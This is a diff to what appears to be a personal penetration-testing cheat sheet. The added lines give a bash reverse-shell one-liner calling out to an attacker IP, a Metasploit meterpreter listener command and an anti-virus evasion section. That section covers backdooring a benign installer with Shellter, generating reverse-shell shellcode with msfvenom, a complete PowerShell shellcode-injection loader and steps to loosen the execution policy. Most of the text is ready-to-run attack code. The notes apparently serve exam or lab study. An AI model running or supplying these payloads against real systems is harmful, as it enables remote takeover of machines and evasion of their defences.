@@ -9,9 +9,16 @@
 `sudo nmap -sS -sV --script=default,vuln -p- -T5 10.10.10.86`
 
 ## Reverse Shell 
+
+### General
+
 ```$ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"```
 
 ```$ nc -nvlp 4444```
+
+### Meterpreter Listener
+
+`msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"`
 
 ## RDP
 `sudo xfreerdp /u:"jason" /drive:/root /v:192.168.247.203`
@@ -347,4 +354,60 @@ Try to compile exploits ON THE TARGET if possible!
 
 ## Windows
 
+
+
+# Anti-virus Evasion
+
+## Automating Process Injection and Evasion with Sheller
+
+We can take a binign app... like an app installer... and put a malicious payload into it! 
+
+Add Required `wine32` and `sheller`
+```
+kali$ sudo apt install shellter
+kali$ sudo apt install wine
+root$ dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+```
+
+## Remote Process Memory Injection Reverse shell to 443 
+
+Starter Script called `bypass.ps1` ... now craft your payload with msfvenom!
+
+Shellcode: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc`
+
+bypass.ps1
+```
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$yeet1 = 
+  Add-Type -memberDefinition $code -Name "yeetWin32" -namespace Win32Functions -passthru;
+
+[Byte[]];
+[Byte[]]$yeet2 = <place your SHELLCODE here>;
+
+$size = 0x1000;
+
+if ($yeet2.Length -gt 0x1000) {$size = $yeet2.Length};
+
+$x = $yeet1::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($yeet2.Length-1);$i++) {$yeet1::memset([IntPtr]($x.ToInt32()+$i), $yeet2[$i], 1)};
+
+$yeet1::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+```
+
+Didn't work? modify the execution policy. 
+
+1. > Get-ExecutionPolicy -Scope CurrentUser
+2. > Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+3. : A
+4. > Get-ExecutionPolicy -Scope CurrentUser
 
